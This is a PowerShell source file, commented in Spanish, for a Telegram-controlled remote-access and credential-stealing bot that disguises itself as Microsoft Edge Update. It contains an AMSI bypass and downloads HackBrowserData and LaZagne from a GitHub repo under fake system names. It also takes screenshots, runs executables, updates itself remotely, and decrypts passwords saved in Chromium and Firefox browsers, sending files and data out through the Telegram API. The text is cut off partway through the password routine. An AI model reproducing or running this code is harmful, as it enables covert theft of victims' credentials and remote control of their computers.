<#
    bot.ps1 - nucleo del bot (payload)
    Se ejecuta EN MEMORIA desde MicrosoftEdgeUpdate.exe (runspace) o standalone.
    ASCII puro, compatible PowerShell 5.1.
#>

# === AMSI bypass (best-effort, sin parchear memoria) ===
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($t) {
        $f = $t.GetField('amsiInitFailed','NonPublic,Static')
        if ($f -and -not $f.GetValue($null)) { $f.SetValue($null, $true) }
    }
} catch {}

$script:Repo = 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main'

if (-not $env:BOT_HOME -or -not (Test-Path $env:BOT_HOME)) { $env:BOT_HOME = "$env:APPDATA\Microsoft\EdgeUpdate" }
$BaseDir = $env:BOT_HOME
New-Item -ItemType Directory -Path $BaseDir -Force -ErrorAction SilentlyContinue | Out-Null

$ConfigFile = "$BaseDir\config.ini"
$Token = ''; $ChatId = ''
if (Test-Path $ConfigFile) {
    Get-Content $ConfigFile | ForEach-Object {
        if ($_ -match '^\s*TOKEN\s*=\s*(.+?)\s*$')   { $Token  = $matches[1].Trim() }
        if ($_ -match '^\s*CHAT_ID\s*=\s*(.+?)\s*$') { $ChatId = $matches[1].Trim() }
    }
}
if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) { return }

$ApiUrl   = "https://api.telegram.org/bot$Token"
$ApiFile  = "https://api.telegram.org/file/bot$Token"
$LogFile  = "$BaseDir\bot.log"
$HackPath = "$BaseDir\DeviceCensus.exe"
$LazPath  = "$BaseDir\CompatTelRunner.exe"
$StateFile= "$BaseDir\bot_state.json"
$UploadDir= "$BaseDir\uploads"
$RamDir   = "$env:TEMP\ram_exec"

$script:CurrentDir            = $PWD.Path
$script:LastStealTime         = $null
$script:ProcessedUpdates      = @{}
$script:Lock                  = New-Object System.Object
$script:ReverseShellActive    = $false
$script:ShellClient           = $null
$script:ShellStream           = $null
$script:FilesExfiltrated      = $false
$script:HackBrowserDataCompleted = $false
$script:LaZagneCompleted      = $false
$script:ArchivosHBDEnviados   = 0
$script:SendPaused            = $false
$script:SendCancelled         = $false
$script:FileQueue             = New-Object System.Collections.ArrayList
$script:PwAutoDone            = $false
$script:EditFiles             = @{}
$script:LastUpdateId          = 0
$script:Polling               = $false
$script:FetchDepth            = 0
$script:LastHeartbeat         = Get-Date
$script:HasCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)

$script:Aliases = @{
    "start"="start"; "menu"="menu"; "help"="help"; "?"="help"; "h"="help"; "ayuda"="help"
    "info"="info"; "ip"="info"; "whoami"="info"; "status"="status"; "estado"="status"
    "pwd"="pwd"; "cwd"="pwd"; "ls"="ls"; "dir"="ls"; "ll"="ls"; "l"="ls"; "cd"="cd"
    "cat"="cat"; "type"="cat"; "ver"="cat"; "rm"="rm"; "del"="rm"; "remove"="rm"; "borrar"="rm"
    "mkdir"="mkdir"; "md"="mkdir"; "mv"="mv"; "move"="mv"; "mover"="mv"; "cp"="cp"; "copy"="cp"; "copiar"="cp"
    "write"="write"; "echo"="write"; "download"="download"; "dl"="download"; "get"="download"; "descargar"="download"
    "edit"="edit"; "editar"="edit"; "cmd"="cmd"; "sh"="cmd"; "term"="cmd"; "consola"="cmd"
    "run"="run"; "exec"="run"; "ejecutar"="run"; "update"="update"; "upgrade"="update"; "actualizar"="update"
    "captura"="captura"; "screenshot"="captura"; "ss"="captura"; "pantalla"="captura"
    "steal"="steal"; "robar"="steal"; "ciclo"="steal"; "hack"="hack"; "hbd"="hack"
    "lazagne"="lazagne"; "laz"="lazagne"; "files"="files"; "docs"="files"; "documentos"="files"
    "passwords"="passwords"; "pass"="passwords"; "pw"="passwords"; "passwd"="passwords"
    "cookies"="cookies"; "cookie"="cookies"; "killbrowsers"="killbrowsers"; "kb"="killbrowsers"
    "pause"="pause"; "pausar"="pause"; "resume"="resume"; "reanudar"="resume"; "continue"="resume"
    "cancelar"="cancelar"; "cancel"="cancelar"; "stop"="cancelar"; "shell"="shell"; "revshell"="shell"
    "stopshell"="stopshell"; "ai"="ai"; "ia"="ai"
}

New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log { param([string]$m) try { Add-Content $LogFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -ErrorAction SilentlyContinue } catch {} }
function Ensure-Tools {
    if (-not (Test-Path $HackPath)) { try { Invoke-WebRequest "$script:Repo/hackbrowserdata.exe" -OutFile $HackPath -UseBasicParsing -TimeoutSec 180 } catch {} }
    if (-not (Test-Path $LazPath))  { try { Invoke-WebRequest "$script:Repo/lazagne.exe" -OutFile $LazPath -UseBasicParsing -TimeoutSec 180 } catch {} }
}

function Split-Message {
    param([string]$Text, [int]$Max = 4000)
    $out = New-Object System.Collections.ArrayList
    if ($null -eq $Text) { $Text = "" }
    if ($Text.Length -le $Max) { [void]$out.Add($Text); return ,$out }
    $cur = ""
    foreach ($ln in ($Text -split "`n")) {
        $line = $ln
        while ($line.Length -gt $Max) { if ($cur.Length -gt 0) { [void]$out.Add($cur); $cur = "" }; [void]$out.Add($line.Substring(0,$Max)); $line = $line.Substring($Max) }
        if (($cur.Length + $line.Length + 1) -gt $Max) { if ($cur.Length -gt 0) { [void]$out.Add($cur) }; $cur = $line }
        elseif ($cur.Length -gt 0) { $cur = "$cur`n$line" } else { $cur = $line }
    }
    if ($cur.Length -gt 0) { [void]$out.Add($cur) }
    return ,$out
}
function Send-Message {
    param([string]$Text)
    if ($null -eq $Text) { return $true }
    $ok = $true
    foreach ($c in (Split-Message $Text)) {
        try { Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{chat_id=$ChatId;text=$c}|ConvertTo-Json -Compress) | Out-Null } catch { $ok = $false }
    }
    return $ok
}
function Send-Message-Buttons {
    param([string]$Text,$Keyboard)
    try { Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{chat_id=$ChatId;text=$Text;reply_markup=$Keyboard}|ConvertTo-Json -Depth 8 -Compress) | Out-Null } catch {}
}
function Answer-Callback { param([string]$Id,[string]$Text="") try { Invoke-RestMethod -Uri "$ApiUrl/answerCallbackQuery" -Method Post -ContentType "application/json" -Body (@{callback_query_id=$Id;text=$Text}|ConvertTo-Json -Compress) | Out-Null } catch {} }

function Send-File-Multipart {
    param([string]$Path,[string]$Caption="")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
        $client = New-Object System.Net.Http.HttpClient; $client.Timeout = [TimeSpan]::FromMinutes(10)
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $content.Add((New-Object System.Net.Http.StringContent($ChatId)), "chat_id")
        $fc = New-Object System.Net.Http.ByteArrayContent([IO.File]::ReadAllBytes($Path))
        $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
        $content.Add($fc, "document", (Split-Path $Path -Leaf))
        if ($Caption) { $content.Add((New-Object System.Net.Http.StringContent($Caption)), "caption") }
        $r = $client.PostAsync("$ApiUrl/sendDocument", $content).Result; $ok = $r.IsSuccessStatusCode; $client.Dispose(); return $ok
    } catch { return $false }
}
function Send-File-Now {
    param([string]$Path,[string]$Caption="")
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    try {
        if ($script:HasCurl) {
            $a = @("-s","-X","POST","$ApiUrl/sendDocument","-F","chat_id=$ChatId","-F","document=@$Path")
            if ($Caption) { $a += "-F","caption=$Caption" }
            $raw = & curl.exe @a 2>&1
            if (($raw | ConvertFrom-Json).ok) { return $true }
        }
        return (Send-File-Multipart -Path $Path -Caption $Caption)
    } catch { return $false }
}
function Send-File {
    param([string]$Path,[string]$Caption="")
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    if ($script:SendCancelled) { return $true }
    if ($script:SendPaused) { [void]$script:FileQueue.Add(@{Path=$Path;Caption=$Caption}); return $true }
    $ok = Send-File-Now -Path $Path -Caption $Caption
    if (-not $script:Polling) { Poll-Updates 0 }
    return $ok
}
function Flush-FileQueue {
    if ($script:FileQueue.Count -eq 0) { Send-Message "Cola vacia."; return }
    foreach ($i in @($script:FileQueue)) { Send-File-Now -Path $i.Path -Caption $i.Caption; Start-Sleep 1 }
    $script:FileQueue.Clear(); Send-Message "Cola enviada."
}

function Get-Info {
    try { $ip = (Invoke-RestMethod 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { $ip = "?" }
    try { $os = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os | EXE: $env:BOT_HOME"
}
function Test-BrowsersOpen { @(Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium,iexplore -ErrorAction SilentlyContinue).Count -gt 0 }
function Get-OpenBrowserNames { ((Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Select-Object -Expand ProcessName -Unique) -join ", ") }
function Stop-Browsers { Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
function Kill-Browsers { $a = Get-OpenBrowserNames; Stop-Browsers; Start-Sleep 2; Send-Message "Navegadores cerrados. Antes: $a" }
function Wait-BrowsersClosed {
    $notified = $false
    while (Test-BrowsersOpen) {
        if (-not $notified) { Send-Message "Navegadores abiertos. Esperando (o usa /killbrowsers)."; $notified = $true }
        Fetch-Updates 0; Start-Sleep 3
    }
    if ($notified) { Send-Message "Navegadores cerrados." }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
        if ($b.Width -le 0) { $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds }
        $bm = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
        $g = [System.Drawing.Graphics]::FromImage($bm)
        $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
        $p = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bm.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bm.Dispose()
        Send-File -Path $p -Caption "Screenshot $($b.Width)x$($b.Height)"; Remove-Item $p -Force -ErrorAction SilentlyContinue
    } catch { Send-Message "Error captura: $($_.Exception.Message)" }
}
function Invoke-ExeInRam {
    param([string]$Path,[string]$Arguments="")
    if (-not (Test-Path $Path)) { Send-Message "No existe: $Path"; return }
    try {
        New-Item -ItemType Directory -Path $RamDir -Force | Out-Null
        $t = Join-Path $RamDir ([IO.Path]::GetFileName($Path))
        [IO.File]::WriteAllBytes($t,[IO.File]::ReadAllBytes($Path))
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName=$t; $psi.Arguments=$Arguments; $psi.UseShellExecute=$false
        $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.CreateNoWindow=$true
        $pr = [System.Diagnostics.Process]::Start($psi)
        $o = $pr.StandardOutput.ReadToEnd() + $pr.StandardError.ReadToEnd(); $pr.WaitForExit(300000)
        Send-Message "RAM exec $([IO.Path]::GetFileName($Path)) -> $($pr.ExitCode)`n$o"
        Remove-Item $t -Force -ErrorAction SilentlyContinue
    } catch { Send-Message "Error RAM exec: $($_.Exception.Message)" }
}
function Update-Bot {
    try {
        $tmp = "$env:TEMP\payload_new.ps1"
        Send-Message "Descargando actualizacion..."
        Invoke-WebRequest "$script:Repo/bot.ps1" -OutFile $tmp -UseBasicParsing -TimeoutSec 60
        if (-not (Test-Path $tmp)) { return }
        Copy-Item $tmp "$BaseDir\payload.ps1" -Force
        Send-Message "Actualizado. Reiniciando..."
        $exe = if ($env:BOT_EXE) { $env:BOT_EXE } else { "$BaseDir\MicrosoftEdgeUpdate.exe" }
        if (Test-Path $exe) { Start-Process $exe } else { Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$BaseDir\payload.ps1`"" }
        return
    } catch { Send-Message "Error update: $($_.Exception.Message)" }
}

# ================== SQLITE ==================
function Get-Varint { param([byte[]]$D,[ref]$O) [long]$r=0;[int]$s=0; while($true){ if($O.Value -ge $D.Length){break}; [int]$b=$D[$O.Value];$O.Value++; $r=$r -bor ([long]($b -band 0x7f) -shl $s); if(($b -band 0x80)-eq 0){break}; $s+=7; if($s -gt 63){break} }; return $r }
function Read-DerLen { param([byte[]]$D,[ref]$P) $b=$D[$P.Value];$P.Value++; if($b -band 0x80){ $n=$b -band 0x7f;$l=0; for($i=0;$i -lt $n;$i++){$l=($l -shl 8) -bor $D[$P.Value];$P.Value++}; return $l }; return $b }
function Read-CellPayload {
    param([byte[]]$Data,[int]$Start,[int]$Len,[int]$Ps)
    $maxL=$Ps-35; $minL=[math]::Floor((($Ps-12)*32)/255)-23; $local=0;$op=0
    if($Len -le $maxL){$local=$Len} else { $k=$minL+(($Len-$minL)%($Ps-4)); if($k -le $maxL){$local=$k}else{$local=$minL}; $o=$Start+$local; $op=(([int]$Data[$o] -shl 24)-bor([int]$Data[$o+1] -shl 16)-bor([int]$Data[$o+2] -shl 8)-bor[int]$Data[$o+3]) }
    $buf=New-Object System.Collections.Generic.List[byte]
    for($i=0;$i -lt $local;$i++){$buf.Add($Data[$Start+$i])}
    $rem=$Len-$local
    while($rem -gt 0 -and $op -ne 0){ $po=($op-1)*$Ps; $nx=(([int]$Data[$po] -shl 24)-bor([int]$Data[$po+1] -shl 16)-bor([int]$Data[$po+2] -shl 8)-bor[int]$Data[$po+3]); $av=[math]::Min($rem,$Ps-4); for($i=0;$i -lt $av;$i++){$buf.Add($Data[$po+4+$i])}; $rem-=$av; $op=$nx }
    return $buf.ToArray()
}
function Parse-Record {
    param([byte[]]$P)
    $p=0; $hl=Get-Varint $P ([ref]$p); $s=@(); while($p -lt $hl){ $s += (Get-Varint $P ([ref]$p)) }
    $v=@(); $vp=$hl
    foreach($x in $s){ switch($x){ 0{$v+=$null} 1{$v+=[int][sbyte]$P[$vp];$vp++} 2{$q=([int]$P[$vp] -shl 8)-bor[int]$P[$vp+1];if($q -ge 32768){$q-=65536};$v+=$q;$vp+=2} 3{$q=([int]$P[$vp] -shl 16)-bor([int]$P[$vp+1] -shl 8)-bor[int]$P[$vp+2];if($q -ge 8388608){$q-=16777216};$v+=$q;$vp+=3} 4{$v+=(([int]$P[$vp] -shl 24)-bor([int]$P[$vp+1] -shl 16)-bor([int]$P[$vp+2] -shl 8)-bor[int]$P[$vp+3]);$vp+=4} 7{$v+=[BitConverter]::ToDouble($P,$vp);$vp+=8} 8{$v+=0} 9{$v+=1} default{ if($x -ge 12){ if($x%2 -eq 0){$l=[int](($x-12)/2);if($l -gt 0){$v+=$P[$vp..($vp+$l-1)]};$vp+=$l} else {$l=[int](($x-13)/2);if($l -gt 0){$v+=[Text.Encoding]::UTF8.GetString($P,$vp,$l)};$vp+=$l} } else {$v+=$null} } } }
    return ,$v
}
function Read-BtreePage {
    param([byte[]]$Data,[int]$Ps,[int]$Pg)
    $rows=New-Object System.Collections.ArrayList; $off=($Pg-1)*$Ps
    if($off+1 -ge $Data.Length){ return ,$rows }
    [int]$type=$Data[$off]
    if($type -eq 0x05){ [int]$n=([int]$Data[$off+3] -shl 8)-bor[int]$Data[$off+4]; for($i=0;$i -lt $n;$i++){ $cp=$off+12+$i*2; $co=$off+(([int]$Data[$cp] -shl 8)-bor[int]$Data[$cp+1]); $ch=(([int]$Data[$co] -shl 24)-bor([int]$Data[$co+1] -shl 16)-bor([int]$Data[$co+2] -shl 8)-bor[int]$Data[$co+3]); foreach($s in (Read-BtreePage $Data $Ps $ch)){[void]$rows.Add($s)} }; $rt=(([int]$Data[$off+8] -shl 24)-bor([int]$Data[$off+9] -shl 16)-bor([int]$Data[$off+10] -shl 8)-bor[int]$Data[$off+11]); foreach($s in (Read-BtreePage $Data $Ps $rt)){[void]$rows.Add($s)} }
    elseif($type -eq 0x0D){ [int]$n=([int]$Data[$off+3] -shl 8)-bor[int]$Data[$off+4]; for($i=0;$i -lt $n;$i++){ $cp=$off+8+$i*2; $co=$off+(([int]$Data[$cp] -shl 8)-bor[int]$Data[$cp+1]); $p=$co; $pl=Get-Varint $Data ([ref]$p); $ri=Get-Varint $Data ([ref]$p); $pl2=Read-CellPayload $Data $p $pl $Ps; if($pl2.Length -gt 0){[void]$rows.Add((Parse-Record $pl2))} } }
    return ,$rows
}
function Parse-Columns { param([string]$Sql) $c=@(); if(-not $Sql){return ,$c}; $i=$Sql.IndexOf('(');$j=$Sql.LastIndexOf(')'); if($i -lt 0 -or $j -le $i){return ,$c}; foreach($p in ($Sql.Substring($i+1,$j-$i-1) -split ',')){ $f=($p.Trim() -split '\s+')[0].Trim('"','`','[',']',' '); if($f -match '^(?i)(PRIMARY|UNIQUE|CHECK|FOREIGN|CONSTRAINT|KEY)$'){continue}; if($f){$c+=$f} }; return ,$c }
function Read-SqliteRows {
    param([string]$Db,[string]$Tbl)
    $o=@(); if(-not (Test-Path -LiteralPath $Db)){return ,$o}
    try {
        $d=[IO.File]::ReadAllBytes($Db); if($d.Length -lt 100){return ,$o}
        if([Text.Encoding]::ASCII.GetString($d,0,15) -ne "SQLite format 3"){return ,$o}
        $ps=([int]$d[16] -shl 8)-bor[int]$d[17]; if($ps -eq 1){$ps=65536}; if($ps -lt 512 -or $ps -gt 65536){return ,$o}
        $root=0;$sql=""
        foreach($r in (Read-BtreePage $d $ps 1)){ if($r.Count -ge 5 -and $r[0] -eq "table" -and $r[1] -eq $Tbl){$root=[int]$r[3];$sql=$r[4];break} }
        if($root -eq 0){return ,$o}
        $cols=Parse-Columns $sql; if($cols.Count -eq 0){return ,$o}
        foreach($r in (Read-BtreePage $d $ps $root)){ $h=@{}; for($i=0;$i -lt $cols.Count -and $i -lt $r.Count;$i++){$h[$cols[$i]]=$r[$i]}; $o += ,$h }
    } catch {}
    return ,$o
}
function Copy-FileShared {
    param([string]$S,[string]$D)
    try { $fs=New-Object IO.FileStream($S,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite); $os=New-Object IO.FileStream($D,[IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None); $fs.CopyTo($os);$os.Close();$fs.Close(); return $true } catch { try { Copy-Item -LiteralPath $S -Destination $D -Force -ErrorAction Stop; return $true } catch { return $false } }
}

# ================== CRIPTO ==================
Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
if (-not ("AesGcmHelper" -as [type])) {
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class AesGcmHelper {
    [DllImport("bcrypt.dll")] static extern uint BCryptOpenAlgorithmProvider(out IntPtr h,string id,string impl,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptSetProperty(IntPtr h,string p,byte[] i,int c,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptGenerateSymmetricKey(IntPtr h,out IntPtr k,IntPtr ko,int koc,byte[] s,int sc,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr k);
    [DllImport("bcrypt.dll")] static extern uint BCryptDecrypt(IntPtr k,byte[] i,int ic,ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pi,byte[] iv,int ivc,byte[] o,int oc,out int r,uint f);
    [StructLayout(LayoutKind.Sequential)] struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO { public int cbSize;public int dwInfoVersion;public IntPtr pbNonce;public int cbNonce;public IntPtr pbAuthData;public int cbAuthData;public IntPtr pbTag;public int cbTag;public IntPtr pbMacContext;public int cbMacContext;public int cbAAD;public long cbData;public int dwFlags; }
    public static byte[] Decrypt(byte[] key,byte[] nonce,byte[] ct,byte[] tag){
        IntPtr h=IntPtr.Zero,k=IntPtr.Zero; GCHandle hn=default(GCHandle),ht=default(GCHandle);
        try { BCryptOpenAlgorithmProvider(out h,"AES",null,0); byte[] cm=System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0"); BCryptSetProperty(h,"ChainingMode",cm,cm.Length,0); BCryptGenerateSymmetricKey(h,out k,IntPtr.Zero,0,key,key.Length,0);
            var info=new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(); info.cbSize=Marshal.SizeOf(info); info.dwInfoVersion=1; hn=GCHandle.Alloc(nonce,GCHandleType.Pinned); ht=GCHandle.Alloc(tag,GCHandleType.Pinned); info.pbNonce=hn.AddrOfPinnedObject(); info.cbNonce=nonce.Length; info.pbTag=ht.AddrOfPinnedObject(); info.cbTag=tag.Length;
            byte[] o=new byte[ct.Length+16]; int rl=0; uint st=BCryptDecrypt(k,ct,ct.Length,ref info,null,0,o,o.Length,out rl,0); if(st!=0) throw new Exception("gcm "+st); byte[] res=new byte[rl]; Array.Copy(o,res,rl); return res;
        } finally { if(hn.IsAllocated)hn.Free(); if(ht.IsAllocated)ht.Free(); if(k!=IntPtr.Zero)BCryptDestroyKey(k); if(h!=IntPtr.Zero)BCryptCloseAlgorithmProvider(h,0); } }
}
"@
}
function Get-ChromiumKey {
    param([string]$LS)
    if (-not (Test-Path -LiteralPath $LS)) { return $null }
    try { $j=Get-Content -LiteralPath $LS -Raw|ConvertFrom-Json; if(-not $j.os_crypt.encrypted_key){return $null}; $e=[Convert]::FromBase64String($j.os_crypt.encrypted_key); if($e.Length -le 5){return $null}; $e=$e[5..($e.Length-1)]; return [Security.Cryptography.ProtectedData]::Unprotect($e,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser) } catch { return $null }
}
function Unprotect-AppBound {
    param([byte[]]$D)
    $LM=[Security.Cryptography.DataProtectionScope]::LocalMachine; $CU=[Security.Cryptography.DataProtectionScope]::CurrentUser
    foreach($c in @(@($LM,$CU),@($CU,$LM),@($CU,$CU),@($LM,$LM))){
        try { $a=[Security.Cryptography.ProtectedData]::Unprotect($D,$null,$c[0]); if($a){ $b=[Security.Cryptography.ProtectedData]::Unprotect($a,$null,$c[1]); if($b -and $b.Length -eq 32){return $b} } } catch {}
    }
    return $null
}
function Get-ChromiumAppBoundKey {
    param([string]$LS)
    if (-not (Test-Path -LiteralPath $LS)) { return $null }
    try { $j=Get-Content -LiteralPath $LS -Raw|ConvertFrom-Json; if(-not $j.os_crypt.app_bound_encrypted_key){return $null}; $e=[Convert]::FromBase64String($j.os_crypt.app_bound_encrypted_key); if($e.Length -le 4){return $null}; $e=$e[4..($e.Length-1)]; return (Unprotect-AppBound $e) } catch { return $null }
}
function Get-ChromiumKeys { param([string]$LS) @{ v10=(Get-ChromiumKey $LS); v20=(Get-ChromiumAppBoundKey $LS) } }
function Invoke-GcmDecrypt { param([byte[]]$K,[byte[]]$E) $n=$E[3..14]; $t=$E[($E.Length-16)..($E.Length-1)]; $cl=$E.Length-31; if($cl -gt 0){$c=$E[15..(15+$cl-1)]}else{$c=[byte[]]@()}; [Text.Encoding]::UTF8.GetString([AesGcmHelper]::Decrypt($K,$n,$c,$t)) }
function Decrypt-ChromiumValue {
    param([byte[]]$E,[hashtable]$K)
    if(-not $E -or $E.Length -eq 0){return ""}
    try {
        if($E.Length -ge 3){ $p=[Text.Encoding]::ASCII.GetString($E,0,3)
            if($p -eq "v10" -or $p -eq "v11"){ if(-not $K.v10){return "(v10 sin clave)"}; return (Invoke-GcmDecrypt $K.v10 $E) }
            if($p -eq "v20"){ if(-not $K.v20){return "(v20 sin clave)"}; return (Invoke-GcmDecrypt $K.v20 $E) } }
        return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($E,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser))
    } catch { return "" }
}
function Extract-ChromiumPasswords {
    $bs=@(
        @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},@{N="ChromeBeta";P="$env:LOCALAPPDATA\Google\Chrome Beta\User Data"},@{N="ChromeCanary";P="$env:LOCALAPPDATA\Google\Chrome SxS\User Data"},
        @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},@{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
        @{N="Opera";P="$env:APPDATA\Opera Software\Opera Stable"},@{N="OperaGX";P="$env:APPDATA\Opera Software\Opera GX Stable"},
        @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data"},@{N="Chromium";P="$env:LOCALAPPDATA\Chromium\User Data"},@{N="Yandex";P="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
    )
    $res=@()
    foreach($b in $bs){
        $ud=$b.P; if(-not (Test-Path -LiteralPath $ud)){continue}
        $ls=Join-Path $ud "Local State"; if(-not (Test-Path -LiteralPath $ls)){ $par=Split-Path $ud -Parent; if(Test-Path (Join-Path $par "Local State")){$ls=Join-Path $par "Local State"} }
        $keys=Get-ChromiumKeys $ls
        $profs=@($ud,(Join-Path $ud "Default")); $profs += (Get-ChildItem $ud -Directory -Filter "Profile *" -ErrorAction SilentlyContinue|%{$_.FullName}); $profs += (Get-ChildItem $ud -Directory -Filter "Default *" -ErrorAction SilentlyContinue|%{$_.FullName})
        foreach($pr in ($profs|Select-Object -Unique)){
            $db=Join-Path $pr "Login Data"; if(-not (Test-Path -LiteralPath $db)){continue}
            $tp="$env:TEMP\ld_$([guid]::NewGuid().ToString('N')).db"; if(-not (Copy-FileShared $db $tp)){continue}
            $rows=Read-SqliteRows $tp "logins"; Remove-Item $tp -Force -ErrorAction SilentlyContinue
            foreach($r in $rows){ $u=$r["origin_url"]; if(-not $u){continue}; $pw=""; if($r["password_value"] -is [byte[]]){$pw=Decrypt-ChromiumValue $r["password_value"] $keys}; $res += [pscustomobject]@{Browser=$b.N;Profile=(Split-Path $pr -Leaf);URL=[string]$u;User=[string]$r["username_value"];Password=[string]$pw} }
        }
    }
    return $res
}
function Des3Cbc { param([byte[]]$K,[byte[]]$Iv,[byte[]]$D) $t=New-Object Security.Cryptography.TripleDESCryptoServiceProvider; $t.Mode='CBC';$t.Padding='PKCS7';$t.Key=$K;$t.IV=$Iv; $t.CreateDecryptor().TransformFinalBlock($D,0,$D.Length) }
function Parse-DerTwo { param([byte[]]$D) $r=@($null,$null); try { $p=0; if($D[$p] -ne 0x30){return ,$r}; $p++; [void](Read-DerLen $D ([ref]$p)); for($k=0;$k -lt 2;$k++){ if($D[$p] -ne 0x04){return ,$r}; $p++; $l=Read-DerLen $D ([ref]$p); $r[$k]=$D[$p..($p+$l-1)]; $p+=$l } } catch {}; return ,$r }
function Parse-DerLast { param([byte[]]$D) $last=$null; try { $p=0; if($D[$p] -ne 0x30){return $D}; $p++; $sl=Read-DerLen $D ([ref]$p); $end=[math]::Min($p+$sl,$D.Length); while($p -lt $end){ $tag=$D[$p];$p++; $l=Read-DerLen $D ([ref]$p); if($tag -eq 0x04){$last=$D[$p..($p+$l-1)]}; $p+=$l } } catch {}; return $last }
function Get-FirefoxKey {
    param([string]$K4)
    try { $tp="$env:TEMP\k4_$([guid]::NewGuid().ToString('N')).db"; if(-not (Copy-FileShared $K4 $tp)){return $null}; $d=[IO.File]::ReadAllBytes($tp); Remove-Item $tp -Force -ErrorAction SilentlyContinue; if($d.Length -lt 32){return $null}; $gs=$d[0..31]
        $m=Read-SqliteRows $K4 "metadata"; if(-not $m -or $m.Count -eq 0){return $null}; $i2=$m[0]["item2"]; if(-not ($i2 -is [byte[]])){return $null}; $pp=Parse-DerTwo $i2; if(-not $pp[0] -or -not $pp[1]){return $null}
        $s=[Security.Cryptography.SHA1]::Create(); $k=$s.ComputeHash($gs+[byte[]]@()); while($k.Length -lt 24){$k=$k+$s.ComputeHash($k)}; $dec=Des3Cbc $k[0..23] $pp[0] $pp[1]; $mk=Parse-DerLast $dec; if(-not $mk){return $null}
        return @{GS=$gs;MK=$mk}
    } catch { return $null }
}
function Decrypt-FirefoxValue { param([string]$B,[byte[]]$GS,[byte[]]$MK) try { $e=[Convert]::FromBase64String($B); if($e.Length -le 8){return ""}; $s=[Security.Cryptography.SHA1]::Create(); $k=$s.ComputeHash($GS+$MK); while($k.Length -lt 24){$k=$k+$s.ComputeHash($k)}; [Text.Encoding]::UTF8.GetString((Des3Cbc $k[0..23] $e[0..7] $e[8..($e.Length-1)])) } catch { return "" } }
function Extract-FirefoxPasswords {
    $res=@()
    foreach($pd in @("$env:APPDATA\Mozilla\Firefox\Profiles","$env:APPDATA\Waterfox\Profiles","$env:APPDATA\librewolf\Profiles")){
        if(-not (Test-Path -LiteralPath $pd)){continue}
        foreach($pr in (Get-ChildItem $pd -Directory -ErrorAction SilentlyContinue)){
            $lg=Join-Path $pr.FullName "logins.json"; $k4=Join-Path $pr.FullName "key4.db"; if(-not (Test-Path $lg) -or -not (Test-Path $k4)){continue}
            try { $km=Get-FirefoxKey $k4; if(-not $km){continue}; $j=Get-Content $lg -Raw|ConvertFrom-Json; foreach($x in $j.logins){ $res += [pscustomobject]@{Browser="Firefox";Profile=$pr.Name;URL=[string]$x.hostname;User=(Decrypt-FirefoxValue $x.encryptedUsername $km.GS $km.MK);Password=(Decrypt-FirefoxValue $x.encryptedPassword $km.GS $km.MK)} } } catch {}
        }
    }
    return $res
}
function Run-Passwords {
    Send-Message "=== PASSWORDS (nativo, sin cerrar navegadores) ==="
    $all=@(); try { $all+=Extract-ChromiumPasswords } catch {}; try { $all+=Extract-FirefoxPasswords } catch {}
    if($all.Count -gt 0){
